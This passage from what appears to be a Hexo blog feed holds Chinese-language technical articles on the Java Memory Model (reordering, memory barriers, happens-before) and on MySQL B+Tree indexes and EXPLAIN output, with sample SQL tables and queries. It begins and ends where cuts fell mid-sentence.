和 B 有主内存中共享变量 x 的副本。假设初始时，这三个内存中的 x 值都为 0。线程 A 在执行时，把更新后的 x 值（假设值为 1）临时存放在自己的本地内存 A 中。当线程 A 和线程 B 需要通信时，线程 A 首先会把自己本地内存中修改后的 x 值刷新到主内存中，此时主内存中的 x 值变为了 1。随后，线程 B 到主内存中去读取线程 A 更新后的 x 值，此时线程 B 的本地内存的 x 值也变为了 1。</p><p>从整体来看，这两个步骤实质上是线程 A 在向线程 B 发送消息，而且这个通信过程必须要经过主内存。JMM 通过控制主内存与每个线程的本地内存之间的交互，来为 java 程序员提供内存可见性保证。</p><h2 id="重排序"><a href="#重排序" class="headerlink" title="重排序"></a><font color=  #8EE5EE  >重排序</font></h2><p>在执行程序时为了提高性能，编译器和处理器常常会对指令做重排序。重排序分三种类型：</p><ol><li>编译器优化的重排序。编译器在不改变单线程程序语义的前提下，可以重新安排语句的执行顺序。</li><li>指令级并行的重排序。现代处理器采用了指令级并行技术（Instruction-Level Parallelism， ILP）来将多条指令重叠执行。如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。</li><li>内存系统的重排序。由于处理器使用缓存和读 / 写缓冲区，这使得加载和存储操作看上去可能是在乱序执行。</li></ol><p>从 java 源代码到最终实际执行的指令序列，会分别经历下面三种重排序：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/9026b8f4b6c1fae4270615e0aadc7cdf.png" alt="img"></p><p>上述的 1 属于编译器重排序，2 和 3 属于处理器重排序。这些重排序都可能会导致多线程程序出现内存可见性问题。对于编译器，JMM 的编译器重排序规则会禁止特定类型的编译器重排序（不是所有的编译器重排序都要禁止）。对于处理器重排序，JMM 的处理器重排序规则会要求 java 编译器在生成指令序列时，插入特定类型的内存屏障（memory barriers，intel 称之为 memory fence）指令，通过内存屏障指令来禁止特定类型的处理器重排序（不是所有的处理器重排序都要禁止）。</p><p>JMM 属于语言级的内存模型，它确保在不同的编译器和不同的处理器平台之上，通过禁止特定类型的编译器重排序和处理器重排序，为程序员提供一致的内存可见性保证。</p><h2 id="处理器重排序与内存屏障指令"><a href="#处理器重排序与内存屏障指令" class="headerlink" title="处理器重排序与内存屏障指令"></a><font color=  #8EE5EE  >处理器重排序与内存屏障指令</font></h2><p>现代的处理器使用写缓冲区来临时保存向内存写入的数据。写缓冲区可以保证指令流水线持续运行，它可以避免由于处理器停顿下来等待向内存写入数据而产生的延迟。同时，通过以批处理的方式刷新写缓冲区，以及合并写缓冲区中对同一内存地址的多次写，可以减少对内存总线的占用。虽然写缓冲区有这么多好处，但每个处理器上的写缓冲区，仅仅对它所在的处理器可见。这个特性会对内存操作的执行顺序产生重要的影响：处理器对内存的读 / 写操作的执行顺序，不一定与内存实际发生的读 / 写操作顺序一致！为了具体说明，请看下面示例：</p><table><thead><tr><th align="center">Processor A</th><th align="center">Processor B</th></tr></thead><tbody><tr><td align="center">a = 1; //A1 x = b; //A2</td><td align="center">b = 2; //B1 y = a; //B2</td></tr></tbody></table><p>初始状态：a = b = 0 处理器允许执行后得到结果：x = y = 0</p><p>假设处理器 A 和处理器 B 按程序的顺序并行执行内存访问，最终却可能得到 x = y = 0 的结果。具体的原因如下图所示：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/7004695e6bacd62e916f2f5ece3d7c9d.png" alt="img"></p><p>这里处理器 A 和处理器 B 可以同时把共享变量写入自己的写缓冲区（A1，B1），然后从内存中读取另一个共享变量（A2，B2），最后才把自己写缓存区中保存的脏数据刷新到内存中（A3，B3）。当以这种时序执行时，程序就可以得到 x = y = 0 的结果。</p><p>从内存操作实际发生的顺序来看，直到处理器 A 执行 A3 来刷新自己的写缓存区，写操作 A1 才算真正执行了。虽然处理器 A 执行内存操作的顺序为：A1-&gt;A2，但内存操作实际发生的顺序却是：A2-&gt;A1。此时，处理器 A 的内存操作顺序被重排序了（处理器 B 的情况和处理器 A 一样，这里就不赘述了）。</p><p>这里的关键是，由于写缓冲区仅对自己的处理器可见，它会导致处理器执行内存操作的顺序可能会与内存实际的操作执行顺序不一致。由于现代的处理器都会使用写缓冲区，因此现代的处理器都会允许对写 - 读操做重排序。</p><p>下面是常见处理器允许的重排序类型的列表：</p><table><thead><tr><th align="center"></th><th align="center">Load-Load</th><th align="center">Load-Store</th><th align="center">Store-Store</th><th align="center">Store-Load</th><th align="center">数据依赖</th></tr></thead><tbody><tr><td align="center">sparc-TSO</td><td align="center">N</td><td align="center">N</td><td align="center">N</td><td align="center">Y</td><td align="center">N</td></tr><tr><td align="center">x86</td><td align="center">N</td><td align="center">N</td><td align="center">N</td><td align="center">Y</td><td align="center">N</td></tr><tr><td align="center">ia64</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">N</td></tr><tr><td align="center">PowerPC</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">N</td></tr></tbody></table><p>上表单元格中的“N”表示处理器不允许两个操作重排序，“Y”表示允许重排序。</p><p>从上表我们可以看出：常见的处理器都允许 Store-Load 重排序；常见的处理器都不允许对存在数据依赖的操作做重排序。sparc-TSO 和 x86 拥有相对较强的处理器内存模型，它们仅允许对写 - 读操作做重排序（因为它们都使用了写缓冲区）。</p><p>※注 1：sparc-TSO 是指以 TSO(Total Store Order) 内存模型运行时，sparc 处理器的特性。</p><p>※注 2：上表中的 x86 包括 x64 及 AMD64。</p><p>※注 3：由于 ARM 处理器的内存模型与 PowerPC 处理器的内存模型非常类似，本文将忽略它。</p><p>※注 4：数据依赖性后文会专门说明。</p><p>为了保证内存可见性，java 编译器在生成指令序列的适当位置会插入内存屏障指令来禁止特定类型的处理器重排序。JMM 把内存屏障指令分为下列四类：</p><table><thead><tr><th align="center">屏障类型</th><th align="center">指令示例</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">LoadLoad Barriers</td><td align="center">Load1; LoadLoad; Load2</td><td align="center">确保 Load1 数据的装载，之前于 Load2 及所有后续装载指令的装载。</td></tr><tr><td align="center">StoreStore Barriers</td><td align="center">Store1; StoreStore; Store2</td><td align="center">确保 Store1 数据对其他处理器可见（刷新到内存），之前于 Store2 及所有后续存储指令的存储。</td></tr><tr><td align="center">LoadStore Barriers</td><td align="center">Load1; LoadStore; Store2</td><td align="center">确保 Load1 数据装载，之前于 Store2 及所有后续的存储指令刷新到内存。</td></tr><tr><td align="center">StoreLoad Barriers</td><td align="center">Store1; StoreLoad; Load2</td><td align="center">确保 Store1 数据对其他处理器变得可见（指刷新到内存），之前于 Load2 及所有后续装载指令的装载。StoreLoad Barriers 会使该屏障之前的所有内存访问指令（存储和装载指令）完成之后，才执行该屏障之后的内存访问指令。</td></tr></tbody></table><p>StoreLoad Barriers 是一个“全能型”的屏障，它同时具有其他三个屏障的效果。现代的多处理器大都支持该屏障（其他类型的屏障不一定被所有处理器支持）。执行该屏障开销会很昂贵，因为当前处理器通常要把写缓冲区中的数据全部刷新到内存中（buffer fully flush）。</p><h2 id="happens-before"><a href="#happens-before" class="headerlink" title="happens-before"></a><font color=  #8EE5EE  >happens-before</font></h2><p>从 JDK5 开始，java 使用新的 JSR -133 内存模型（本文除非特别说明，针对的都是 JSR- 133 内存模型）。JSR-133 提出了 happens-before 的概念，通过这个概念来阐述操作之间的内存可见性。如果一个操作执行的结果需要对另一个操作可见，那么这两个操作之间必须存在 happens-before 关系。这里提到的两个操作既可以是在一个线程之内，也可以是在不同线程之间。 与程序员密切相关的 happens-before 规则如下：</p><ul><li>程序顺序规则：一个线程中的每个操作，happens- before 于该线程中的任意后续操作。</li><li>监视器锁规则：对一个监视器锁的解锁，happens- before 于随后对这个监视器锁的加锁。</li><li>volatile 变量规则：对一个 volatile 域的写，happens- before 于任意后续对这个 volatile 域的读。</li><li>传递性：如果 A happens- before B，且 B happens- before C，那么 A happens- before C。</li></ul><p>注意，两个操作之间具有 happens-before 关系，并不意味着前一个操作必须要在后一个操作之前执行！happens-before 仅仅要求前一个操作（执行的结果）对后一个操作可见，且前一个操作按顺序排在第二个操作之前（the first is visible to and ordered before the second）。happens- before 的定义很微妙，后文会具体说明 happens-before 为什么要这么定义。</p><p>happens-before 与 JMM 的关系如下图所示：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/bc22eaae1a77f9e1a6c09f4b6a833163.png" alt="img"></p><p>如上图所示，一个 happens-before 规则通常对应于多个编译器重排序规则和处理器重排序规则。对于 java 程序员来说，happens-before 规则简单易懂，它避免程序员为了理解 JMM 提供的内存可见性保证而去学习复杂的重排序规则以及这些规则的具体实现。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li><a href="http://www.amazon.com/Programming-Language-Pragmatics-Third-Michael/dp/0123745144/ref=sr_1_1?s=books&ie=UTF8&qid=1347794595&sr=1-1&keywords=Michael+L.Scott">Programming Language Pragmatics, Third Edition</a></li><li><a href="http://docs.oracle.com/javase/specs/jls/se5.0/jls3.pdf">The Java Language Specification, Third Edition</a></li><li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/jsr133.pdf">JSR-133: Java Memory Model and Thread Specification</a></li><li><a href="http://www.ibm.com/developerworks/java/library/j-jtp03304/index.html">Java theory and practice: Fixing the Java Memory Model, Part 2</a></li><li><a href="http://www.cl.cam.ac.uk/~pes20/ppc-supplemental/pldi105-sarkar.pdf">Understanding POWER Multiprocessors</a></li><li><a href="http://www.amazon.com/Concurrent-Programming-Windows-Joe-Duffy/dp/032143482X/ref=sr_1_1?ie=UTF8&s=books&qid=1262571776&sr=1-1">Concurrent Programming on Windows</a></li><li><a href="http://www.amazon.com/Art-Multiprocessor-Programming-Maurice-Herlihy/dp/0123705916/ref=sr_1_1?ie=UTF8&s=books&qid=1248834374&sr=1-1">The Art of Multiprocessor Programming</a></li><li><a href="http://download.intel.com/products/processor/manual/253668.pdf">Intel® 64 and IA-32 ArchitecturesvSoftware Developer’s Manual Volume 3A: System Programming Guide, Part 1</a></li><li><a href="http://www.amazon.com/Java-Concurrency-Practice-Brian-Goetz/dp/0321349601/ref=pd_sim_b_1">Java Concurrency in Practice</a></li><li><a href="http://gee.cs.oswego.edu/dl/jmm/cookbook.html">The JSR-133 Cookbook for Compiler Writers</a></li></ol><h2 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h2><p><strong>程晓明</strong>，Java 软件工程师，国家认证的系统分析师、信息项目管理师。专注于并发编程，就职于富士通南大。个人邮箱：<a href="mailto:asst2003@163.com">asst2003@163.com</a>。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL的索引</title>
      <link href="/%E7%B4%A2%E5%BC%95/"/>
      <url>/%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<p>索引类似大学图书馆建书目索引，可以提高数据检索的效率，降低数据库的IO成本。MySQL在300万条记录左右性能开始逐渐下降，虽然官方文档说500~800w记录，所以大数据量建立索引是非常有必要的。MySQL提供了Explain，用于显示SQL执行的详细信息，可以进行索引的优化,转自：<a href="http://cmsblogs.com/?p=2818">http://cmsblogs.com/?p=2818</a></p><a id="more"></a><h1 id="MySQL的索引是什么？怎么优化"><a href="#MySQL的索引是什么？怎么优化" class="headerlink" title="MySQL的索引是什么？怎么优化"></a>MySQL的索引是什么？怎么优化</h1><h2 id="一、导致SQL执行慢的原因："><a href="#一、导致SQL执行慢的原因：" class="headerlink" title="一、导致SQL执行慢的原因："></a>一、导致SQL执行慢的原因：</h2><ol><li>硬件问题。如网络速度慢，内存不足，I/O吞吐量小，磁盘空间满了等。</li><li>没有索引或者索引失效。（一般在互联网公司，DBA会在半夜把表锁了，重新建立一遍索引，因为当你删除某个数据的时候，索引的树结构就不完整了。所以互联网公司的数据做的是假删除.一是为了做数据分析,二是为了不破坏索引 ）</li><li>数据过多（分库分表）</li><li>服务器调优及各个参数设置（调整my.cnf）</li></ol><h2 id="二、分析原因时，一定要找切入点："><a href="#二、分析原因时，一定要找切入点：" class="headerlink" title="二、分析原因时，一定要找切入点："></a>二、分析原因时，一定要找切入点：</h2><ol><li>先观察，开启慢查询日志，设置相应的阈值（比如超过3秒就是慢SQL），在生产环境跑上个一天过后，看看哪些SQL比较慢。</li><li>Explain和慢SQL分析。比如SQL语句写的烂，索引没有或失效，关联查询太多（有时候是设计缺陷或者不得以的需求）等等。</li><li>Show Profile是比Explain更近一步的执行细节，可以查询到执行每一个SQL都干了什么事，这些事分别花了多少秒。</li><li>找DBA或者运维对MySQL进行服务器的参数调优。</li></ol><h2 id="三、什么是索引？"><a href="#三、什么是索引？" class="headerlink" title="三、什么是索引？"></a>三、什么是索引？</h2><p>MySQL官方对索引的定义为：索引(Index)是帮助MySQL高效获取数据的数据结构。我们可以简单理解为：<strong>快速查找排好序的一种数据结构</strong>。Mysql索引主要有两种结构：B+Tree索引和Hash索引。我们平常所说的索引，如果没有特别指明，一般都是指B树结构组织的索引(B+Tree索引)。索引如图所示：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/112127_Ikol_3577599.png" alt="img"></p><p>最外层浅蓝色磁盘块1里有数据17、35（深蓝色）和指针P1、P2、P3（黄色）。P1指针表示小于17的磁盘块，P2是在17-35之间，P3指向大于35的磁盘块。真实数据存在于子叶节点也就是最底下的一层3、5、9、10、13……非叶子节点不存储真实的数据，只存储指引搜索方向的数据项，如17、35。 查找过程：例如搜索28数据项，首先加载磁盘块1到内存中，发生一次I/O，用二分查找确定在P2指针。接着发现28在26和30之间，通过P2指针的地址加载磁盘块3到内存，发生第二次I/O。用同样的方式找到磁盘块8，发生第三次I/O。 真实的情况是，上面3层的B+Tree可以表示上百万的数据，上百万的数据只发生了三次I/O而不是上百万次I/O，时间提升是巨大的。</p><h2 id="四、Explain分析"><a href="#四、Explain分析" class="headerlink" title="四、Explain分析"></a>四、Explain分析</h2><p>   前文铺垫完成，进入实操部分，先来插入测试需要的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user_info`</span> (</span><br><span class="line">  <span class="string">`id`</span>   <span class="built_in">BIGINT</span>(<span class="number">20</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">`age`</span>  <span class="built_in">INT</span>(<span class="number">11</span>)              <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`name_index`</span> (<span class="string">`name`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;xys&#x27;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;a&#x27;</span>, <span class="number">21</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;b&#x27;</span>, <span class="number">23</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;c&#x27;</span>, <span class="number">50</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;d&#x27;</span>, <span class="number">15</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;e&#x27;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;f&#x27;</span>, <span class="number">21</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;g&#x27;</span>, <span class="number">23</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;h&#x27;</span>, <span class="number">50</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_info (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">&#x27;i&#x27;</span>, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`order_info`</span> (</span><br><span class="line">  <span class="string">`id`</span>           <span class="built_in">BIGINT</span>(<span class="number">20</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`user_id`</span>      <span class="built_in">BIGINT</span>(<span class="number">20</span>)           <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`product_name`</span> <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">`productor`</span>    <span class="built_in">VARCHAR</span>(<span class="number">30</span>)          <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`user_product_detail_index`</span> (<span class="string">`user_id`</span>, <span class="string">`product_name`</span>, <span class="string">`productor`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;p1&#x27;</span>, <span class="string">&#x27;WHH&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;p2&#x27;</span>, <span class="string">&#x27;WL&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;p1&#x27;</span>, <span class="string">&#x27;DX&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;p1&#x27;</span>, <span class="string">&#x27;WHH&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;p5&#x27;</span>, <span class="string">&#x27;WL&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="string">&#x27;p3&#x27;</span>, <span class="string">&#x27;MA&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">&#x27;p1&#x27;</span>, <span class="string">&#x27;WHH&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="string">&#x27;p1&#x27;</span>, <span class="string">&#x27;WHH&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> order_info (user_id, product_name, productor) <span class="keyword">VALUES</span> (<span class="number">9</span>, <span class="string">&#x27;p8&#x27;</span>, <span class="string">&#x27;TE&#x27;</span>);</span><br></pre></td></tr></table></figure><p>初体验，执行Explain的效果：<img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/121439_Z3a2_3577599.png" alt="img">索引使用情况在possible_keys、key和key_len三列，接下来我们先从左到右依次讲解。</p><h3 id="1-id"><a href="#1-id" class="headerlink" title="1.id"></a>1.id</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--id相同,执行顺序由上而下</span></span><br><span class="line"><span class="keyword">explain</span> <span class="keyword">select</span> u.*,o.* <span class="keyword">from</span> user_info u,order_info o <span class="keyword">where</span> u.id=o.user_id;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/120821_19p8_3577599.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--id不同,值越大越先被执行</span></span><br><span class="line"><span class="keyword">explain</span> <span class="keyword">select</span> * <span class="keyword">from</span>  user_info  <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> user_id <span class="keyword">from</span> order_info <span class="keyword">where</span>  product_name =<span class="string">&#x27;p8&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/121702_Iwdh_3577599.png" alt="img"></p><h3 id="2-select-type"><a href="#2-select-type" class="headerlink" title="2.select_type"></a>2.select_type</h3><p>可以看id的执行实例，总共有以下几种类型：</p><ul><li>SIMPLE： 表示此查询不包含 UNION 查询或子查询</li><li>PRIMARY： 表示此查询是最外层的查询</li><li>SUBQUERY： 子查询中的第一个 SELECT</li><li>UNION： 表示此查询是 UNION 的第二或随后的查询</li><li>DEPENDENT UNION： UNION 中的第二个或后面的查询语句, 取决于外面的查询</li><li>UNION RESULT, UNION 的结果</li><li>DEPENDENT SUBQUERY: 子查询中的第一个 SELECT, 取决于外面的查询. 即子查询依赖于外层查询的结果.</li><li>DERIVED：衍生，表示导出表的SELECT（FROM子句的子查询）</li></ul><h3 id="3-table"><a href="#3-table" class="headerlink" title="3.table"></a>3.table</h3><p>table表示查询涉及的表或衍生的表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">explain</span> <span class="keyword">select</span> tt.* <span class="keyword">from</span> (<span class="keyword">select</span> u.* <span class="keyword">from</span> user_info u,order_info o <span class="keyword">where</span> u.id=o.user_id <span class="keyword">and</span> u.id=<span class="number">1</span>) tt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/122403_q7HH_3577599.png" alt="img"></p><p>id为1的的表示id为2的u和o表衍生出来的。</p><h3 id="4-type"><a href="#4-type" class="headerlink" title="4.type"></a>4.type</h3><p>type 字段比较重要，它提供了判断查询是否高效的重要依据依据。 通过 type 字段，我们判断此次查询是 全表扫描 还是 索引扫描等。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/123445_DS5A_3577599.png" alt="img"></p><p>type 常用的取值有:</p><ul><li>system: 表中只有一条数据， 这个类型是特殊的 const 类型。</li><li>const: 针对主键或唯一索引的等值查询扫描，最多只返回一行数据。 const 查询速度非常快， 因为它仅仅读取一次即可。例如下面的这个查询，它使用了主键索引，因此 type 就是 const 类型的：explain select * from user_info where id = 2；</li><li>eq_ref: 此类型通常出现在多表的 join 查询，表示对于前表的每一个结果，都只能匹配到后表的一行结果。并且查询的比较操作通常是 =，查询效率较高。例如：explain select * from user_info, order_info where user_info.id = order_info.user_id;</li><li>ref: 此类型通常出现在多表的 join 查询，针对于非唯一或非主键索引，或者是使用了 最左前缀 规则索引的查询。例如下面这个例子中， 就使用到了 ref 类型的查询：explain select * from user_info, order_info where user_info.id = order_info.user_id AND order_info.user_id = 5</li><li>range: 表示使用索引范围查询，通过索引字段范围获取表中部分数据记录。这个类型通常出现在 =, &lt;&gt;, &gt;, &gt;=, &lt;, &lt;=, IS NULL, &lt;=&gt;, BETWEEN, IN() 操作中。例如下面的例子就是一个范围查询：explain select * from user_info  where id between 2 and 8；</li><li>index: 表示全索引扫描(full index scan)，和 ALL 类型类似，只不过 ALL 类型是全表扫描，而 index 类型则仅仅扫描所有的索引， 而不扫描数据。index 类型通常出现在：所要查询的数据直接在索引树中就可以获取到, 而不需要扫描数据。当是这种情况时，Extra 字段 会显示 Using index。</li><li>ALL: 表示全表扫描，这个类型的查询是性能最差的查询之一。通常来说， 我们的查询不应该出现 ALL 类型的查询，因为这样的查询在数据量大的情况下，对数据库的性能是巨大的灾难。 如一个查询是 ALL 类型查询， 那么一般来说可以对相应的字段添加索引来避免。</li></ul><p>通常来说, 不同的 type 类型的性能关系如下：<strong>ALL &lt; index &lt; range ~ index_merge &lt; ref &lt; eq_ref &lt; const &lt; system</strong> ALL 类型因为是全表扫描， 因此在相同的查询条件下，它是速度最慢的。而 index 类型的查询虽然不是全表扫描，但是它扫描了所有的索引，因此比 ALL 类型的稍快.后面的几种类型都是利用了索引来查询数据，因此可以过滤部分或大部分数据，因此查询效率就比较高了。</p><h3 id="5-possible-keys"><a href="#5-possible-keys" class="headerlink" title="5.possible_keys"></a>5.possible_keys</h3><p>它表示 mysql 在查询时，可能使用到的索引。 注意，即使有些索引在 possible_keys 中出现，但是并不表示此索引会真正地被 mysql 使用到。 mysql 在查询时具体使用了哪些索引，由 key 字段决定。</p><h3 id="6-key"><a href="#6-key" class="headerlink" title="6.key"></a>6.key</h3><p>此字段是 mysql 在当前查询时所真正使用到的索引。比如请客吃饭,possible_keys是应到多少人，key是实到多少人。当我们没有建立索引时：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">explain</span> <span class="keyword">select</span> o.* <span class="keyword">from</span> order_info o <span class="keyword">where</span>  o.product_name= <span class="string">&#x27;p1&#x27;</span> <span class="keyword">and</span>  o.productor=<span class="string">&#x27;whh&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">index</span> idx_name_productor <span class="keyword">on</span> order_info(productor);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">index</span> idx_name_productor <span class="keyword">on</span> order_info;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/125327_FPOE_3577599.png" alt="img"></p><p>建立复合索引后再查询：<img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/125433_FYqv_3577599.png" alt="img"></p><h3 id="7-key-len"><a href="#7-key-len" class="headerlink" title="7.key_len"></a>7.key_len</h3><p>表示查询优化器使用了索引的字节数，这个字段可以评估组合索引是否完全被使用。</p><h3 id="8-ref"><a href="#8-ref" class="headerlink" title="8.ref"></a>8.ref</h3><p>这个表示显示索引的哪一列被使用了，如果可能的话,是一个常量。前文的type属性里也有ref，注意区别。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/130207_O2xw_3577599.png" alt="img"></p><h3 id="9-rows"><a href="#9-rows" class="headerlink" title="9.rows"></a>9.rows</h3><p>rows 也是一个重要的字段，mysql 查询优化器根据统计信息，估算 sql 要查找到结果集需要扫描读取的数据行数，这个值非常直观的显示 sql 效率好坏， 原则上 rows 越少越好。可以对比key中的例子，一个没建立索引钱，rows是9，建立索引后，rows是4。</p><h3 id="10-extra"><a href="#10-extra" class="headerlink" title="10.extra"></a>10.extra</h3><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/131233_Wm8a_3577599.png" alt="img"></p><p>explain 中的很多额外的信息会在 extra 字段显示, 常见的有以下几种内容:</p><ul><li>using filesort ：表示 mysql 需额外的排序操作，不能通过索引顺序达到排序效果。一般有 using filesort都建议优化去掉，因为这样的查询 cpu 资源消耗大。</li><li>using index：覆盖索引扫描，表示查询在索引树中就可查找所需数据，不用扫描表数据文件，往往说明性能不错。</li><li>using temporary：查询有使用临时表, 